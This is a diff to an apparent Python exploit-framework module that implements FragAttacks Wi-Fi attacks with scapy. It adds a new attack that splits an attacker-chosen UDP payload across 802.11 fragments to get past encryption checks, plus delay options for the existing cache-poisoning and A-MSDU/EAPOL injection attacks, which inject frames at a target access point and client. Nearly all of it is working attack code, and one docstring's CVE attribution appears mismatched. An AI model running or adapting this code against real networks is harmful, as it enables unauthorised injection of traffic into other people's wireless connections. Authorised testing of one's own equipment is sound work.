@@ -11,14 +11,20 @@ Implements the core attack primitives from the FragAttacks research
   - eapol_plaintext_inject   Inject plaintext frames via EAPOL/A-MSDU
   - broadcast_fragment_cache Broadcast fragment cache poisoning
   - pn_reuse_test            Test for PN/IV reuse after rekeying
+  - udp_plaintext_inject     Inject UDP plaintext payload via fragmentation
 
 Each attack crafts specific 802.11 frames using scapy. The module provides
 both individual primitives and combined test sequences.
 
+Improvements incorporated from upstream vanhoefm/fragattacks:
+  - Pre-test delay option (PR #44)
+  - UDP plaintext injection mode (issue #56)
+  - 802.11ax compatibility notes (issue #55)
+
 Requires: Monitor mode interface with frame injection capability.
 Dependencies: scapy, pycryptodome (for CCMP encryption).
 
-Version: 1.0.0
+Version: 1.1.0
 """
 
 from __future__ import annotations
@@ -180,17 +186,26 @@ class Exploit(Exploit):
     interface = OptString("wlan0mon", "Monitor mode interface with injection")
     attack = OptString(
         "cache_poison",
-        "Attack: cache_poison | mixed_key | amsdu_inject | eapol_inject | pn_test",
+        "Attack: cache_poison | mixed_key | amsdu_inject | eapol_inject | udp_inject | pn_test",
     )
     target_bssid = OptMAC("", "Target AP BSSID")
     target_client = OptMAC("", "Target client MAC address")
     attacker_ip = OptString("192.168.1.100", "Attacker IP for payload injection")
     target_ip = OptString("192.168.1.1", "Target IP for payload injection")
+    target_port = OptInteger(80, "Target port for UDP plaintext injection")
     channel = OptInteger(1, "Wi-Fi channel")
     inject_count = OptInteger(10, "Number of injection rounds")
     qos_tid = OptInteger(0, "QoS TID for fragment injection")
+    pre_test_delay = OptFloat(0.0, "Delay (seconds) before each test/injection round")
+    inject_delay = OptFloat(0.05, "Delay (seconds) between injected frames")
     output_pcap = OptString("fragattacks_capture.pcap", "Output PCAP file")
     dry_run = OptBool(False, "Show configuration without executing")
+
+    def _apply_pre_test_delay(self) -> None:
+        """Apply configured pre-test delay if set."""
+        if self.pre_test_delay > 0:
+            logger.info("Pre-test delay: %.1fs", self.pre_test_delay)
+            time.sleep(self.pre_test_delay)
 
     def _cache_poison_attack(self) -> None:
         """Fragment cache poisoning (CVE-2020-24586).
@@ -199,6 +214,7 @@ class Exploit(Exploit):
         When a legitimate second fragment arrives, it reassembles with
         the poisoned first fragment, injecting attacker content.
         """
+        self._apply_pre_test_delay()
         print_status("Fragment cache poisoning attack...")
 
         poison_payload = bytes(LLC() / SNAP() / IP(
@@ -212,7 +228,7 @@ class Exploit(Exploit):
 
         for i in range(self.inject_count):
             sendp(frag1, iface=self.interface, verbose=False)
-            time.sleep(0.05)
+            time.sleep(self.inject_delay)
 
         print_success("Injected {} poisoned first fragments (seq=42, tid={}).".format(
             self.inject_count, self.qos_tid))
@@ -224,6 +240,7 @@ class Exploit(Exploit):
         Vulnerable implementations reassemble fragments encrypted with
         different temporal keys.
         """
+        self._apply_pre_test_delay()
         print_status("Mixed key fragment attack...")
         print_info("This attack requires triggering a rekey between fragments.")
 
@@ -253,6 +270,7 @@ class Exploit(Exploit):
         Crafts frames that appear as EAPOL (bypassing plaintext acceptance)
         but contain A-MSDU subframes with arbitrary payload.
         """
+        self._apply_pre_test_delay()
         print_status("EAPOL/A-MSDU injection attack...")
 
         inner = bytes(IP(
@@ -266,9 +284,37 @@ class Exploit(Exploit):
 
         for i in range(self.inject_count):
             sendp(frame, iface=self.interface, verbose=False)
-            time.sleep(0.02)
+            time.sleep(self.inject_delay)
 
         print_success("Injected {} EAPOL/A-MSDU frames.".format(self.inject_count))
+
+    def _udp_plaintext_inject(self) -> None:
+        """UDP plaintext injection via fragmentation (issue #56).
+
+        Injects a plaintext UDP payload by splitting it across 802.11
+        fragments, bypassing encryption checks on some implementations.
+        """
+        self._apply_pre_test_delay()
+        print_status("UDP plaintext injection via fragmentation...")
+
+        udp_payload = bytes(LLC() / SNAP() / IP(
+            src=self.attacker_ip, dst=self.target_ip,
+        ) / UDP(dport=self.target_port, sport=12345) / Raw(
+            b"FRAGATTACK_UDP_INJECT"))
+
+        frag1, frag2 = build_fragment_pair(
+            self.target_client, self.target_bssid, self.target_bssid,
+            udp_payload, seq=300, tid=self.qos_tid,
+        )
+
+        for i in range(self.inject_count):
+            sendp(frag1, iface=self.interface, verbose=False)
+            time.sleep(self.inject_delay / 2)
+            sendp(frag2, iface=self.interface, verbose=False)
+            time.sleep(self.inject_delay)
+
+        print_success("Injected {} UDP plaintext fragment pairs to port {}.".format(
+            self.inject_count, self.target_port))
 
     def _pn_reuse_test(self) -> None:
         """Test for PN/IV reuse after rekeying (CVE-2020-24588).
@@ -336,6 +382,7 @@ class Exploit(Exploit):
             "mixed_key": self._mixed_key_attack,
             "amsdu_inject": self._amsdu_injection_attack,
             "eapol_inject": self._amsdu_injection_attack,
+            "udp_inject": self._udp_plaintext_inject,
             "pn_test": self._pn_reuse_test,
         }
 
